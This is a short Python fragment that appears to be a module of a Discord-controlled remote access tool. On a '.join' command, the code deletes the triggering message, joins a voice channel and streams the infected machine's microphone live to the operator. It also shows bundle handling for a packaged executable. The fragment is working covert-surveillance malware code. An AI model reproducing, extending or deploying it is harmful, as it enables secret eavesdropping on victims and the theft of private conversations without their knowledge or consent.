from resources.misc import *
import pyaudio
import sys
import os
# end of imports
# on message
elif message.content == '.join':
    #.log Message is "join vc and stream microphone" 
    await message.delete()
    #.log Removed the message 
    vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
    #.log Connected to voice channel 
    vc.play(PyAudioPCM())
    #.log Started playing audio from microphone\'s input 
    await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
    #.log Sent message about joining the voice channel 
# !opus_initialization
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)
# anywhere
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        #.log Started PyAudioPCM class 
        p = pyaudio.PyAudio()
        #.log Initialized PyAudio 
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
        #.log Started streaming the audio 
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
